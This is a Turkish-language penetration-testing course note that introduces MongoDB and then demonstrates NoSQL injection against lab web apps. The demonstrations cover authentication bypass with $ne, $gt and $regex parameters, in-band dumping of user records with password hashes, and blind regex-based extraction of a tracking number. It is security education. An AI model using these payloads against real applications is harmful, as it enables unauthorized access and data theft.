---
{"dg-publish":true,"permalink":"/web-pentest-expert/4-no-sql-injection/","created":"2024-12-06T17:52:14.144+03:00","updated":"2025-06-29T13:56:05.199+03:00"}
---

Birçok uygulama parolalar, e-posta adresleri veya yorumlar gibi verileri depolamak için veritabanlarını kullanır. En popüler veritabanı motoru `relational` yani ilişkisel (örneğin [Oracle](https://www.oracle.com/database/) ve [MySQL](https://www.mysql.com/)). Ancak son on yılda, NoSQL veritabanları olarak da bilinen `non-relational` veritabanları giderek daha yaygın hale gelmiştir ve MongoDB şu anda en çok kullanılan [5. veritabanı motorudur](https://db-engines.com/en/ranking) (Kasım 2022 itibariyle).

![Pasted image 20241206175737.png](/img/user/resimler/Pasted%20image%2020241206175737.png)

Dört ana NoSQL veritabanı türü vardır ve hepsi verileri benzer şekilde tablolarda, satırlarda (`rows`) ve sütunlarda (`columns`) depolayan ilişkisel veritabanlarının aksine, NoSQL veritabanlarının verileri depolama şekli farklı kategoriler ve uygulamalar arasında önemli ölçüde farklılık gösterir.

| Tür                            | Açıklama                                                                                                                                                          | En Popüler 3 Motor (Kasım 2022 itibarıyla)                  |
| ------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| **Document-Oriented Database** | Verileri, `field` ve `value` çiftlerinden oluşan documents içinde depolar. Bu documents genellikle `JSON` veya `XML` gibi formatlarda kodlanır.                   | MongoDB, Amazon DynamoDB, Google Firebase - Cloud Firestore |
| **Key-Value Database**         | Verileri `key:value` çiftleri (dictionary olarak da bilinir) şeklinde depolayan bir veri yapısıdır.                                                               | Redis, Amazon DynamoDB, Azure Cosmos DB                     |
| **Wide-Column Store**          | Verileri, relational database gibi tables, rows ve columns halinde depolamak için kullanılır, ancak daha belirsiz veri türlerini işleyebilme yeteneğine sahiptir. | Apache Cassandra, Apache HBase, Azure Cosmos DB             |
| **Graph Database**             | Verileri nodes halinde depolar ve relationships tanımlamak için edges kullanır.                                                                                   | Neo4j, Azure Cosmos DB, Virtuoso                            |

Bu bölümde, en popüler NoSQL veritabanı olduğu için yalnızca `MongoDB`'ye odaklanacağız.


###  MongoDB'ye giriş

MongoDB document-oriented bir veritabanıdır, yani veriler field ve value'lerden oluşan doküman koleksiyonlarında saklanır. MongoDB'de bu document'ler [BSON](https://bsonspec.org/) (Binary JSON) olarak kodlanır. Bir MongoDB veritabanında saklanabilecek bir document örneği şöyledir:

[[BSON Açıklama\|BSON Açıklama]] 

```javascript
{
  _id: ObjectId("63651456d18bf6c01b8eeae9"),
  type: 'Granny Smith',
  price: 0.65
}
```

Burada document'ın `field`'larını (“`type`”, “`price`”) ve ilgili `value`'lerini (“`Granny Smith`”, “`0.65`”) görebiliriz. `_id` filed'i MongoDB tarafından bir dökumanın `primer key`'i olarak kullanılmak üzere ayrılmıştır ve tüm koleksiyon boyunca benzersiz olmalıdır.


### MongoDB'ye Bağlanma

Bir MongoDB veritabanı ile komut satırından etkileşim kurmak için connection string'i geçerek `mongosh`'u kullanabiliriz. `27017/tcp`'nin MongoDB için varsayılan port olduğunu unutmayın.

```shell-session
[!bash!]$ mongosh mongodb://127.0.0.1:27017

Current Mongosh Log ID: 636510136bfa115e590dae03
Connecting to:          mongodb://127.0.0.1:27017/?directConnection=true&serverSelectionTimeoutMS=2000&appName=mongosh+1.6.0
Using MongoDB:          6.0.2
Using Mongosh:          1.6.0

For mongosh info see: https://docs.mongodb.com/mongodb-shell/

test>
```

Hangi veritabanlarının var olduğunu bu şekilde kontrol edebiliriz:

```javascript
test> show databases
admin       72.00 KiB
config     108.00 KiB
local       40.00 KiB
```


### Database Oluşturma

MongoDB, siz o veritabanında ilk kez veri depolayana kadar bir veritabanı oluşturmaz. `use` komutunu kullanarak `academy` adında yeni bir veritabanına “`switch (geçiş)`” edebiliriz:

```javascript
test> use academy
switched to db academy
academy>
```

`show collections` ile bir veritabanındaki tüm koleksiyonları listeleyebiliriz.


#### Inserting Data

Bir veritabanı oluşturmaya benzer şekilde, MongoDB yalnızca bu `koleksiyona` ilk kez bir `document` eklediğinizde bir `koleksiyon` oluşturur. Bir koleksiyona çeşitli şekillerde data ekleyebiliriz.

Apples koleksiyonuna şu şekilde tek bir `document` ekleyebiliriz:

```javascript
academy> db.apples.insertOne({type: "Granny Smith", price: 0.65})
{
  acknowledged: true,
  insertedId: ObjectId("63651456d18bf6c01b8eeae9")
}
```

Ve apples koleksiyonuna bu şekilde birden fazla  `document` ekleyebiliriz:

```javascript
academy> db.apples.insertMany([{type: "Golden Delicious", price: 0.79}, {type: "Pink Lady", price: 0.90}])
{
  acknowledged: true,
  insertedIds: {
    '0': ObjectId("6365147cd18bf6c01b8eeaea"),
    '1': ObjectId("6365147cd18bf6c01b8eeaeb")
  }
}
```


#### Selecting Data

Diyelim ki `Granny Smith` apple'larının fiyatını kontrol etmek istedik. Bunu yapmanın bir yolu, eşleştirmek istediğimiz field'leri ve value'leri içeren bir document belirtmektir:

```javascript
academy> db.apples.find({type: "Granny Smith"})
{
  _id: ObjectId("63651456d18bf6c01b8eeae9"),
  type: 'Granny Smith',
  price: 0.65
}
```

Ya da belki koleksiyondaki tüm document'leri listelemek istedik. Bunu boş bir document geçirerek yapabiliriz (tüm documentlerin bir alt kümesi olduğu için):

```javascript
academy> db.apples.find({})
[
  {
    _id: ObjectId("63651456d18bf6c01b8eeae9"),
    type: 'Granny Smith',
    price: 0.65
  },
  {
    _id: ObjectId("6365147cd18bf6c01b8eeaea"),
    type: 'Golden Delicious',
    price: 0.79
  },
  {
    _id: ObjectId("6365147cd18bf6c01b8eeaeb"),
    type: 'Pink Lady',
    price: 0.90
  }
]
```

Type'ı '`G`' ile başlayan ve fiyatı `0,70`'den az olan tüm apple'ları bulmak gibi daha gelişmiş sorgular yapmak istersek [query operators](https://www.mongodb.com/docs/manual/reference/operator/query/) bir kombinasyonunu kullanmamız gerekir. MongoDB'de birçok `query operatörü` vardır, ancak en yaygın olanlardan bazıları şunlardır:

| Tür            | Operator | Açıklama                                                                                                                                  | Örnek                                                |
| -------------- | -------- | ----------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| **Comparison** | `$eq`    | Belirtilen değere eşit olan values ile eşleşir.                                                                                           | `type: {$eq: "Pink Lady"}`                           |
| **Comparison** | `$gt`    | Belirtilen değerden büyük olan values ile eşleşir.                                                                                        | `price: {$gt: 0.30}`                                 |
| **Comparison** | `$gte`   | Belirtilen değere eşit veya büyük olan values ile eşleşir.                                                                                | `price: {$gte: 0.50}`                                |
| **Comparison** | `$in`    | Belirtilen array içinde yer alan values ile eşleşir.                                                                                      | `type: {$in: ["Granny Smith", "Pink Lady"]}`         |
| **Comparison** | `$lt`    | Belirtilen değerden küçük olan values ile eşleşir.                                                                                        | `price: {$lt: 0.60}`                                 |
| **Comparison** | `$lte`   | Belirtilen değere eşit veya küçük olan values ile eşleşir.                                                                                | `price: {$lte: 0.75}`                                |
| **Comparison** | `$nin`   | Belirtilen array içinde yer almayan values ile eşleşir.                                                                                   | `type: {$nin: ["Golden Delicious", "Granny Smith"]}` |
| **Logical**    | `$and`   | Belirtilen iki query koşulunu da sağlayan documents ile eşleşir.                                                                          | `$and: [{type: 'Granny Smith'}, {price: 0.65}]`      |
| **Logical**    | `$not`   | Belirtilen query koşulunu sağlamayan documents ile eşleşir.                                                                               | `type: {$not: {$eq: "Granny Smith"}}`                |
| **Logical**    | `$nor`   | Belirtilen query koşullarından hiçbirini sağlamayan documents ile eşleşir.                                                                | `$nor: [{type: 'Granny Smith'}, {price: 0.79}]`      |
| **Logical**    | `$or`    | Belirtilen query koşullarından en az birini sağlayan documents ile eşleşir.                                                               | `$or: [{type: 'Granny Smith'}, {price: 0.79}]`       |
| **Evaluation** | `$mod`   | Belirtilen divisor ile bölündüğünde belirli bir remainder bırakan values ile eşleşir.                                                     | `price: {$mod: [4, 0]}`                              |
| **Evaluation** | `$regex` | Belirtilen RegEx ile eşleşen values ile eşleşir.                                                                                          | `type: {$regex: /^G.*/}`                             |
| **Evaluation** | `$where` | Belirtilen [JavaScript expression](https://www.mongodb.com/docs/manual/reference/operator/query/where/)'ı sağlayan documents ile eşleşir. | `$where: 'this.type.length === 9'`                   |

Daha önceki örneğe dönecek olursak, type'ı '`G`' ile başlayan ve fiyatı `0,70`'ten az olan tüm apple'ları seçmek istersek, bunu yapabiliriz:

```javascript
academy> db.apples.find({
    $and: [
        {
            type: {
                $regex: /^G/
            }
        },
        {
            price: {
                $lt: 0.70
            }
        }
    ]
});
[
  {
    _id: ObjectId("63651456d18bf6c01b8eeae9"),
    type: 'Granny Smith',
    price: 0.65
  }
]
```

Alternatif olarak, aynı sonucu elde etmek için `$where` operatörünü kullanabiliriz:

```javascript
academy> db.apples.find({$where: `this.type.startsWith('G') && this.price < 0.70`});
[
  {
    _id: ObjectId("63651456d18bf6c01b8eeae9"),
    type: 'Granny Smith',
    price: 0.65
  }
]
```

`Find` sorgularındaki verileri sıralamak istiyorsak, bunu [`sort`](https://www.mongodb.com/docs/manual/reference/method/cursor.sort/) fonksiyonunu ekleyerek yapabiliriz. Örneğin, azalan sırada fiyata göre sıralanmış ilk iki elmayı seçmek istiyorsak, bunu şu şekilde yapabiliriz:

```javascript
academy> db.apples.find({}).sort({price: -1}).limit(2)
[
  {
    _id: ObjectId("6365147cd18bf6c01b8eeaeb"),
    type: 'Pink Lady',
    price: 0.9
  },
  {
    _id: ObjectId("6365147cd18bf6c01b8eeaea"),
    type: 'Golden Delicious',
    price: 0.79
  }
]
```

Eğer sıralama yönünü tersine çevirmek istersek, `-1 (Descending)` yerine `1 (Ascending)` kullanırız. Sondaki `.limit(2)`, döndürülecek sonuç sayısını sınırlandırmamıza olanak tanır.

### Updating Documents

Update işlemleri bir **`filter`** ve bir **`update` operation** alır. **`Filter`**, güncelleme yapacağımız **documents**’i seçer ve **update operation**, bu **documents** üzerinde gerçekleştirilir. **`Query operators`** gibi, MongoDB’de **[update operators](https://www.mongodb.com/docs/manual/reference/operator/update/#std-label-update-operators-processing-order)** da vardır. En yaygın kullanılan **update operator** `$set` olup, belirtilen **field**’in **value**’sini günceller.

Örneğin, **`Granny Smith`** apple'larının fiyatı enflasyon nedeniyle **`0.65`**’ten **`1.99`**’a yükseldiyse, **document**’i güncellemek için şu işlemi yaparız:

```javascript
academy> db.apples.updateOne({type: "Granny Smith"}, {$set: {price: 1.99}})
{
  acknowledged: true,
  insertedId: null,
  matchedCount: 1,
  modifiedCount: 1,
  upsertedCount: 0
}
```

Tüm apple'ların fiyatlarını aynı anda artırmak istiyorsak, `$inc` operatörünü kullanabilir ve bunu yapabiliriz:

```javascript
academy> db.apples.updateMany({}, {$inc: {quantity: 1, "price": 1}})
{
  acknowledged: true,
  insertedId: null,
  matchedCount: 3,
  modifiedCount: 3,
  upsertedCount: 0
}
```

`$set` **operator**, mevcut bir **document** içindeki belirli **fields**’i güncellememizi sağlar. Ancak, eğer **document**’i tamamen değiştirmek istiyorsak, bunu `replaceOne` ile şu şekilde yapabiliriz:

```javascript
academy> db.apples.replaceOne({type:'Pink Lady'}, {name: 'Pink Lady', price: 0.99, color: 'Pink'})
{
  acknowledged: true,
  insertedId: null,
  matchedCount: 1,
  modifiedCount: 1,
  upsertedCount: 0
}
```


### Removing Documents

Bir **document** silmek, **documents** seçmeye çok benzer. Bir **query** geçiririz ve eşleşen **documents** silinir. Örneğin, fiyatı `0.80`'den düşük olan apple'ların silinmesini isteseydik:

```javascript
academy> db.apples.remove({price: {$lt: 0.8}})
{ acknowledged: true, deletedCount: 2 }
```

Şimdiye kadar, NoSQL veritabanları ve MongoDB'nin nasıl kullanılacağı hakkında temel bir anlayışa sahip olmalısınız. Aşağıdaki bölüm NoSQL enjeksiyon saldırılarının bazı temellerini kapsayacaktır.


## NoSQL Injection Nedir?

`User input`'u önce uygun şekilde sterilize edilmeden bir NoSQL sorgusuna dahil edildiğinde, NoSQL injection meydana gelebilir. Bir saldırgan sorgunun bir kısmını kontrol edebilirse, mantığı alt üst edebilir ve sunucunun istenmeyen eylemleri gerçekleştirmesini / istenmeyen sonuçları döndürmesini sağlayabilir. NoSQL'in SQL gibi standartlaştırılmış bir sorgu dili [olmadığından](https://www.iso.org/obp/ui/#iso:std:iso-iec:9075:-1:ed-5:v1:en), NoSQL injection saldırıları çeşitli NoSQL uygulamalarında farklı görünür.


### Senaryo (Node.JS)

Kullanıcı bilgilerini depolamak için `MongoDB` kullanan bir `Express / Node.JS` web sunucusu hayal edelim. Bu sunucu, bir kullanıcının bilgilerini kullanıcı adından almanızı sağlayan `/api/v1/getUser` endpoint'ine sahiptir.

```javascript
// Express, Node.JS için bir Web -Framework'tür
const express = require('express');
const app = express();
app.use(express.json()); // Express'e JSON request body'lerini kabul etmesini söyler

// Node.JS için MongoDB driver ve
// local MongoDB veritabanımız için //  connection string
const {MongoClient} = require('mongodb');
const uri = "mongodb://127.0.0.1:27017/test";
const client = new MongoClient(uri);

// POST /api/v1/getUser
// Input (JSON): {"username": <username>}
// Returns: User details where username=<username>
app.post('/api/v1/getUser', (req, res) => {
    client.connect(function(_, con) {
        const cursor = con
            .db("example")
            .collection("users")
            .find({username: req.body['username']});
        cursor.toArray(function(_, result) {
            res.send(result);
        });
    });
});

// Express'e sunucumuzu başlatmasını ve 3000 numaralı portu dinlemesini söyler
app.listen(3000, () => {
  console.log(`Listening...`);
});
```

[[Kod Detaylı Açıklama -1 \|Kod Detaylı Açıklama -1 ]]

Not: [Pratikte](https://restfulapi.net/http-methods/) bu muhtemelen `/api/v1/getUser/<username>` gibi bir GET isteği olacaktır, ancak basitlik adına burada bir POST'tur.

Bu endpoint'in kullanım amacı şu şekildedir:

```shell-session
[!bash!]$ curl -s -X POST http://127.0.0.1:3000/api/v1/getUser -H 'Content-Type: application/json' -d '{"username": "gerald1992"}' | jq

[
  {
    "_id": "63667326b7417b004543513a",
    "username": "gerald1992",
    "password": "0f626d75b12f77ede3822843320ed7eb",
    "role": 1,
    "email": "[email]"
  }
]
```

Biz `/api/v1/getUser` endpoint'ini `{“username”: “gerald1992"}` şeklinde gönderdik ve sunucu bunu kullanarak `db.users.find({username: ‘gerald1992’})` sorgusunun tamamını oluşturdu ve sonuçları bize döndürdü.

Sorun, sunucunun herhangi bir filtre veya kontrol olmaksızın `username` sorgusu olarak verdiğimiz her şeyi körü körüne kullanmasıdır. Aşağıda `NoSQL injection`'a karşı savunmasız olan bir kod örneği bulunmaktadır:

```javascript
...
.find({username: req.body['username']});
...
```

Bu injection açığından yararlanmanın basit bir örneği, sunucuyu tüm kullanıcıların (kullanıcı adları `/.*/` ile eşleşen) bilgilerini döndürmeye zorlamak için önceki bölümde açıklanan `$regex` operatörünü kullanmaktır:

```shell-session
[!bash!]$ curl -s -X POST http://127.0.0.1:3000/api/v1/getUser -H 'Content-Type: application/json' -d '{"username": {"$regex": ".*"}}' | jq

[
  {
    "_id": "63667302b7417b0045435139",
    "username": "bmdyy",
    "password": "f25a2fc72690b780b2a14e140ef6a9e0",
    "role": 0,
    "email": "[email]"
  },
  {
    "_id": "63667326b7417b004543513a",
    "username": "gerald1992",
    "password": "0f626d75b12f77ede3822843320ed7eb",
    "role": 1,
    "email": "[email]"
  }
]
```


### NoSQL Injection Türleri

Eğer **SQL injection** konusunda bilginiz varsa, karşılaşabileceğimiz farklı **injection** türlerine zaten aşinasınızdır:

- **`In-Band:`** Saldırganın aynı iletişim kanalını kullanarak bir **NoSQL injection** gerçekleştirdiği ve sonuçları aldığı durumdur. Yukarıdaki senaryo buna bir örnektir.

- **`Blind:`** Saldırganın **NoSQL injection** sonucunda doğrudan bir yanıt almadığı, ancak sunucunun tepkisine dayanarak sonuçları çıkarım yapabildiği durumdur.

	- **`Boolean:`** **Blind injection**'ın bir alt türüdür. Saldırganlar, sunucuya bir **query** çalıştırarak **True** veya **False** sonucuna göre farklı bir yanıt dönmesini sağlar.

	- **`Time-Based:`** **Blind injection**'ın diğer bir alt türüdür. Saldırganlar, sunucunun belirli bir süre boyunca yanıt vermemesini sağlayarak **query**'nin **True** veya **False** olarak değerlendirildiğini anlamaya çalışır.

NoSQL injection'ın temellerini açıkladıktan sonra, biraz daha derinlemesine örneklere geçelim.


## Bypassing Authentication

### MangoMail

Bu bölümde `MangoMail`'i ele alacağız. Bu web uygulaması bir `authentication bypass`'ına karşı savunmasızdır.

Web sayfasında bir login portalı vardır ve başka bir şey yoktur; muhtemelen bu internal bir webmail servisidir.

![Pasted image 20250325213323.png](/img/user/resimler/Pasted%20image%2020250325213323.png)

Formu test verileriyle dolduracağız ve request'i BurpSuite ile intercept edeceğiz. Bu sürece zaten aşina olduğunuz varsayılmaktadır.

![Pasted image 20250325213426.png](/img/user/resimler/Pasted%20image%2020250325213426.png)

POST request'inde , test verileriyle doldurulmuş olan URL kodlu `e-mail` ve `password` parametrelerini görüyoruz. Şaşırtıcı olmayan bir şekilde, bu login denemesi başarısız oluyor.

`Server-side`'da, bu parametrelerin aktarıldığı authentication fonksiyonu aşağıdaki gibi görünür:

```php
...
if ($_SERVER['REQUEST_METHOD'] === "POST"):
    if (!isset($_POST['email'])) die("Missing `email` parameter");
    if (!isset($_POST['password'])) die("Missing `password` parameter");
    if (empty($_POST['email'])) die("`email` can not be empty");
    if (empty($_POST['password'])) die("`password` can not be empty");

    $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
    $query = new MongoDB\Driver\Query(array("email" => $_POST['email'], "password" => $_POST['password']));
    $cursor = $manager->executeQuery('mangomail.users', $query);
        
    if (count($cursor->toArray()) > 0) {
        ...
```

Server'ın, `e-posta` ve `password`'ün her ikisinin de sağlanıp sağlanmadığını ve boş olup olmadığını kontrol ettiğini görebiliriz; bu doğrulama yapılmadan önce herhangi bir işlem gerçekleştirilmez. Bu doğrulandıktan sonra, local olarak çalışan bir MongoDB instance'ına bağlanır ve ardından verilen `e-posta` ve `password` çiftine sahip bir kullanıcı olup olmadığını görmek için `mangomail`'i sorgular:

```javascript
db.users.find({
    email: "<email>",
    password: "<password>"
});
```

Sorun şu ki, hem `e-posta` hem de `username` kullanıcı tarafından kontrol edilen inputlardır ve MongoDB sorgusuna `unsanitized` olarak aktarılırlar. Bu da (saldırganlar olarak) sorgunun kontrolünü ele geçirebileceğimiz anlamına gelir.

Bu bölümün ilk kısmında birçok **query operator** tanıtıldı ve bu **query**'yi nasıl manipüle edeceğiniz konusunda zaten bir fikriniz olabilir. Şu an için, bu **query**'nin herhangi bir **document** ile eşleşmesini istiyoruz çünkü bu, eşleştiği kişi olarak kimlik doğrulamamızın gerçekleşmesini sağlayacaktır. Bunu yapmanın basit bir yolu, **`$ne` query operator**'ünü hem **`email`** hem de **`password`** için kullanarak, var olmadığını bildiğimiz bir şeye eşit olmayan değerleri eşleştirmektir. Başka bir deyişle, **email** değeri `'test@test.com'` olmayan ve **password** değeri `'test'` olmayan bir **query** oluşturmak istiyoruz.

```javascript
db.users.find({
    email: {$ne: "test@test.com"},
    password: {$ne: "test"}
});
```

**Email** ve **password**, **URL-encoded parameters** olarak iletildiğinden, doğrudan **JSON object** geçiremeyiz; **syntax**'ı biraz değiştirmemiz gerekiyor.

**URL-encoded parameters** kullanarak **PHP**'ye veri ilettiğimizde, `param[$op]=val` ifadesi, `param: {$op: val}` ile aynı anlama gelir. Bu nedenle, kimlik doğrulamayı atlatmak için şu ifadeleri kullanacağız:

`email[$ne]=test@testcom` ve `password[$ne]=test`.

![Pasted image 20250325215007.png](/img/user/resimler/Pasted%20image%2020250325215007.png)

`test@testcom:test` bilgileriyle giriş yapamadığımızı bildiğimize göre, bunlar geçersiz kimlik bilgileri demektir. Bu durumda, bu **query**, **users collection** içinde bazı **document**'lerle eşleşmelidir.

Form parametrelerini güncelleyip isteği ilettiğimizde, kimlik doğrulamayı başarıyla atlattığımızı görmeliyiz.

![Pasted image 20250325215020.png](/img/user/resimler/Pasted%20image%2020250325215020.png)


### Alternative Queries

Her iki parametrede de `$ne`, authentication'ı atlamak için işe yaramış olsa da, her ihtimale karşı alternatiflere sahip olmak her zaman yararlıdır. Bir örnek, her iki alanda da `$regex` sorgu parametresini `/.*/` ile eşleştirmek için kullanmak olabilir; bu, 0 veya daha fazla kez tekrarlanan herhangi bir karakter anlamına gelir ve bu nedenle her şeyle eşleşir.

```javascript
db.users.find({
    email: {$regex: /.*/},
    password: {$regex: /.*/}
});
```

Bunu URL-encoded formuna uyarlayabilir, request'i yeniden gönderebilir ve authentication'ı tekrar bypass edebiliriz.

![Pasted image 20250325215150.png](/img/user/resimler/Pasted%20image%2020250325215150.png)

Çalışabilecek bazı diğer **payload**'lar şunlardır:

- `email=admin%40mangomail.com&password[$ne]=x`: Bu, **admin**'in **email** adresini bildiğimizi ve doğrudan onu hedef almak istediğimizi varsayar.
- `email[$gt]=&password[$gt]=`: Boş bir **string**'den "daha büyük" olan herhangi bir **string** eşleşecektir.
- `email[$gte]=&password[$gte]=`: Yukarıdaki ile aynı mantık geçerlidir.

Bunların dışında, aynı etkiyi elde etmek için farklı **query operator**'leri birleştirebilir ve değiştirebilirsiniz. **Query operator**'lerini daha iyi anlamak için biraz zaman ayırmak, **NoSQL injection**'ı gerçek ortamlarda **exploit** etmeye çalışırken faydalı olacaktır.


## In-Band Data Extraction

### Teori

Geleneksel **SQL database**'lerinde, **in-band data extraction** zafiyetleri genellikle tüm **database**'in sızdırılmasına yol açabilir. Ancak **MongoDB**, **`non-relational` database** olduğu ve **query**'ler belirli **collection**'lar üzerinde gerçekleştirildiği için, saldırılar genellikle **injection**'ın uygulandığı **collection** ile sınırlıdır.

### MangoSearch

Bu bölümde **`MangoSearch`**'e göz atacağız. Bu uygulama, **`in-band data extraction`** zafiyetine sahiptir.

Web sitesi oldukça basittir: **Wikipedia**'dan bir alıntı, bir **mango** resmi ve farklı **mango** türleri hakkında bilgi bulabileceğiniz bir **search area**.

![Pasted image 20250325220116.png](/img/user/resimler/Pasted%20image%2020250325220116.png)

Önerilen türlerden birini aratarak hangi **request**'in gönderildiğini ve ne tür bilgilerin döndüğünü inceleyebiliriz.

![Pasted image 20250325220137.png](/img/user/resimler/Pasted%20image%2020250325220137.png)

Görüldüğü üzere, **search form**, **GET request** gönderiyor ve **search query**, URL'de `?q=<search term>` şeklinde iletiliyor. Önceki bölümde olduğu gibi, bu da **URL-encoded data** olduğundan, kullanmak istediğimiz herhangi bir **NoSQL query**'sinin `param[$op]=val` formatında olması gerektiğini unutmamalıyız.

**Server side**'da yapılan **request** muhtemelen **database**'i sorgulayarak `$_GET['q']` ile eşleşen **`name`** alanına sahip **document**'leri bulmaya çalışacaktır. Sorgu şu şekilde olabilir:

```javascript
db.types.find({
    name: $_GET['q']
});
```

**Collection** içindeki tüm türlerin bilgilerini listelemek istiyoruz. **Back-end**'in inputumuzun nasıl işlediğine dair varsayımımız doğruysa, her şeyle eşleşecek bir **RegEx query** kullanabiliriz. Şöyle bir **query** işimizi görecektir:

```javascript
db.types.find({
    name: {$regex: /.*/}
});
```

Yeni request'i gönderdikten sonra, tüm mango türlerinin ve bunlara karşılık gelen bilgilerin listelendiğini görmeliyiz.

![Pasted image 20250325220417.png](/img/user/resimler/Pasted%20image%2020250325220417.png)


### Alternative Queries

- `name: {$ne: 'doesntExist'}`: **doesntExist**'in hiçbir **document**'ün **name** değerine eşit olmadığını varsayarsak, bu **query**, tüm **document**'lerle eşleşir.

- `name: {$gt: ''}`: Bu, **name** değeri boş bir **string**'den "büyük" olan tüm **document**'lerle eşleşir.

- `name: {$gte: ''}`: Bu, **name** değeri boş bir **string**'den "büyük veya eşit" olan tüm **document**'lerle eşleşir.

- `name: {$lt: '~'}`: Bu, **name**'in ilk karakterini **`Tilda`** karakteriyle karşılaştırır ve eğer "daha küçük"se eşleşir. Bu her zaman çalışmayabilir, ancak bu durumda çalışır çünkü **`Tilda`** en büyük yazdırılabilir **[ASCII](https://www.asciitable.com/)** değeri olup, koleksiyondaki tüm **name**'ler **ASCII** karakterlerinden oluşur.

- `name: {$lte: '~'}`: Yukarıdaki ile aynı mantık geçerlidir, ancak ayrıca **name**'i **`~`** karakteriyle başlayan **document**'lerle de eşleşir.

| Karakter | ASCII Kodu |
| -------- | ---------- |
| A        | 65         |
| B        | 66         |
| Z        | 90         |
| a        | 97         |
| c        | 99         |
| ~        | 126        |
## Blind Data Extraction

### MangoPost

Aşağıdaki iki bölümde **`MangoPost`**'a bakacağız. Bu web sitesi, **blind `NoSQL injection`** zafiyetine sahiptir ve biz de bu zafiyeti kullanarak **data extraction** yapacağız.

Web sayfası, bir **package tracking application**'dır; burada bir **`tracking number`** girerek gönderi hakkında bilgi alabilirsiniz.

![Pasted image 20250325223056.png](/img/user/resimler/Pasted%20image%2020250325223056.png)

Bilinmiş bir **tracking number** (`32A766??`) arayabiliriz ve **request**'i yakalayarak sunucuya nelerin gönderildiğini ve ne tür bilgiler aldığımızı görebiliriz.

![Pasted image 20250325223200.png](/img/user/resimler/Pasted%20image%2020250325223200.png)

**Request**, girdiğimiz **`trackingNum`**'u gönderiyor ve başka hiçbir şey göndermiyor. Önceki iki örnekte olduğu gibi **URL-encoded data** yerine bir **JSON object** gönderildiği dikkate değer bir noktadır.

![Pasted image 20250325223238.png](/img/user/resimler/Pasted%20image%2020250325223238.png)

Form gönderildiğinde sayfanın yenilenmediğini veya başka bir yere yönlendirilmediğini fark etmiş olabilirsiniz. Bunun sebebi, sayfada bulunan bir **JavaScript** script'idir; bu script, form datalarını bir **`JSON` object**'e dönüştürür, **`XMLHttpRequest`** ile bir **`POST` request** gönderir ve ardından sayfadaki **`trinfo`** element'ini günceller. Bunu, CTRL-U tuşlarına basarak veya `viewsource:http://SERVER_IP:PORT/index.php` adresine giderek görebiliriz.

![Pasted image 20250325224406.png](/img/user/resimler/Pasted%20image%2020250325224406.png)

**`TrackingNum`**'un, paketleri sorgularken gönderdiğimiz tek bilgi olduğunu bildiğimize göre, **back end**'de çalıştırılan **query**'nin şu şekilde göründüğünü varsayabiliriz:

```javascript
db.tracking.find({
    trackingNum: <trackingNum from JSON>
});
```

Buradaki **NoSQL injection** zaten net olmalıdır. Daha önce ele aldığımız teknikleri kullanarak `bazı` paketlere ait **tracking information**'ı döndürebiliriz.

Ancak bu bölümde, **`trackingNum`**'un ne olduğunu bulmaya odaklanacağız. Bunu doğrudan öğrenmemiz mümkün değildir, çünkü **`trackingNum`** bize dönen bilgide yer almaz. Ancak yapabileceğimiz şey, sunucunun bizim için değerlendireceği bir dizi "true/false" **request** göndermektir.

Örneğin, sunucuya, **`trackingNum`**'un `$ne: 'x'` ile eşleşip eşleşmediğini sorabiliriz ve sunucu **package info** ile cevap verir.

![Pasted image 20250325225148.png](/img/user/resimler/Pasted%20image%2020250325225148.png)

Benzer şekilde, sunucuya **trackingNum**'un `$eq: 'x'` ile eşleşip eşleşmediğini sorabiliriz ve beklediğimiz gibi, sunucu bize böyle bir paket olmadığını söyleyecektir.

![Pasted image 20250325225228.png](/img/user/resimler/Pasted%20image%2020250325225228.png)

Bu noktada, sunucuya sağladığımız herhangi bir **query** ile **trackingNum**'un eşleşip eşleşmediğini sorabileceğimizi ve sunucunun bize `true` ya da `false` diye cevap vereceğini biliyoruz. Buna **`oracle`** diyoruz. İstediğimiz bilgiyi doğrudan (`trackingNum`) alamıyoruz, ancak server'ın response'larını kullanarak **arbitrary queries** sağlayıp, bilgiyi dolaylı olarak sızdırabiliriz.


#### Leaking Franz's Tracking Number

Bu bölümün başında **tracking number** olarak `32A766??`'yi kullanmıştık. Eğer bu numarayı bilmiyor olsaydık, nasıl sızdırabileceğimize bakalım.

İlk **query**'miz olarak `{"trackingNum":{"$regex":"^.*"}}` gönderebiliriz ve bu, tüm **document**'lerle eşleşir. Bize dönen, `Franz Pflaumenbaum` adına gönderilmiş bir paket olacaktır. Koleksiyonda birden fazla paket olabilir, bu yüzden aynı paketten bilgi sızdırdığımızdan emin olmak için sunucunun yanıtında `Franz Pflaumenbaum`'ı arayacağız ve doğru paketi hedeflediğimizden emin olacağız.

![Pasted image 20250325225431.png](/img/user/resimler/Pasted%20image%2020250325225431.png)

Bir sonraki **query**'mizde, **`trackingNum`**'un `0` ile başlayıp başlamadığını görmek için `{"trackingNum":{"$regex":"^0.*"}}` göndereceğiz. Bu, "Bu takip numarası mevcut değil" yanıtını döndürüyor, bu da koleksiyonda `0` ile başlayan herhangi bir **`tracking number`** olmadığını gösteriyor, dolayısıyla bunu eliyoruz.

Sonrasında, 1, 2 ile başlayarak bunu tekrar edeceğiz, ta ki `{"trackingNum":{"$regex":"^3.*"}}` gönderene kadar, bu da Franz'ın paket bilgisini döndürüyor. Artık onun **tracking number**'ının 3 ile başladığını biliyoruz.

![Pasted image 20250325225514.png](/img/user/resimler/Pasted%20image%2020250325225514.png)

Şimdi ikinci rakama geçelim. `{"trackingNum":{"$regex":"^30.*"}}` isteği "Bu takip numarası mevcut değil" yanıtını döndürüyor, bu da ikinci rakamın 0 olmadığını gösteriyor, ancak karakterleri denemeye devam edebiliriz. Ta ki `{"trackingNum":{"$regex":"^32.*"}}` isteği, Franz'ın paket bilgisini döndürene kadar. Bu da, onun **`tracking number`**'ındaki bir sonraki karakterin `2` olduğunu anlamamızı sağlıyor.

![Pasted image 20250325225545.png](/img/user/resimler/Pasted%20image%2020250325225545.png)

Bu işlemi, tüm paket numarası sızdırılana kadar devam ettirebiliriz. Paket numarasının sadece sayılardan değil, harflerden de oluştuğunu unutmayın. Bir **dolar işareti (`$`)**, düzenli ifadeye eklenir ve bu, bir string'in sonunu işaret eder, bu nedenle bu durumda tüm **`trackingNum`**'ın sızdırıldığını doğrulayabiliriz.

![Pasted image 20250325231239.png](/img/user/resimler/Pasted%20image%2020250325231239.png)

